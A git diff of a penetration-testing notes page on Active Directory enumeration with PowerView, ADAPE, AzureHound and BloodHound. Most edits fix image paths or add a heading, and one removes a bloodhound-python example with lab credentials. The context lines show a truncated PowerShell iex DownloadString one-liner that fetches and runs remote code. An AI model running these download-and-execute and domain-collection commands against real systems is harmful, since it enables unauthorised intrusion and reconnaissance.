@@ -69,9 +69,9 @@ powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.16
 
 #### PowerView Cheat Sheet:
 
-![](../../../.gitbook/assets/image%20%28171%29.png)
+![](../../.gitbook/assets/image%20%28171%29.png)
 
-![](../../../.gitbook/assets/image%20%28172%29.png)
+![](../../.gitbook/assets/image%20%28172%29.png)
 
 
 
@@ -89,7 +89,7 @@ powershell -command iex (New-Object Net.WebClient).DownloadString('http://192.16
 powershell.exe -ExecutionPolicy Bypass ./ADAPE.ps1 
 ```
 
- 
+## Domain Mapping \(Bloodhound\)
 
 ### [AzureHound](https://posts.specterops.io/introducing-bloodhound-4-0-the-azure-update-9b2b26c5e350)
 
@@ -121,12 +121,6 @@ Invoke-AzureHound
 # /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1
 Invoke-BloodHound -SearchForest -CSVFolder C:\Users\Public
 Invoke-BloodHound -CollectionMethod All  -LDAPUser <UserName> -LDAPPass <Password> -OutputDirectory <PathToFile>
-
-
-# or remotely via BloodHound Python
-# https://github.com/fox-it/BloodHound.py
-pip install bloodhound
-bloodhound-python -d lab.local -u rsmith -p Winter2017 -gc LAB2008DC01.lab.local -c all
 ```
 
 Then import the zip/json files into the Neo4J database and query them.
